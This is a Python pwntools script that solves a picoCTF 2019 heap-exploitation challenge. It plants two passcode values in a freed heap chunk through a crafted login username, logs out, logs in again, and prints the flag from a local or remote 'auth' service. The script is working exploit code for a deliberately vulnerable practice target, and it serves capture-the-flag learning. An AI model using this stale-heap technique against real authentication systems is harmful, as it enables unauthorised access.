#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "critical"

argv = sys.argv

ac1 = 0x4343415f544f4f52 #passcode
ac2 = 0x45444f435f535345 #passcode2

if len(argv) > 1:
	print "Running remotely"
	p = remote('2019shell1.picoctf.com', 45173)
else:
	print "Running locally"
	p = process('./auth')

def login(user):
	p.sendlineafter('Enter your command:', 'login')
	p.sendlineafter('length of your username', str(len(user)+1))
	p.sendlineafter('enter your username', user)

def logout():
	p.sendlineafter('Enter your command:', 'logout')

def printflag():
	p.sendlineafter('Enter your command:', 'print-flag')

payload = ''
payload+= 'A'*8		#buffer where the next username will be stored
payload+= p64(ac1)	#first 4 of the pass ode
payload+= p64(ac2)	#second 4 off the passcode

login(payload)		#store passcode on the heap
logout()			#clear login
login('trash')		#fill the extra heap so print-flag will check the passcodes
printflag()	
p.interactive()
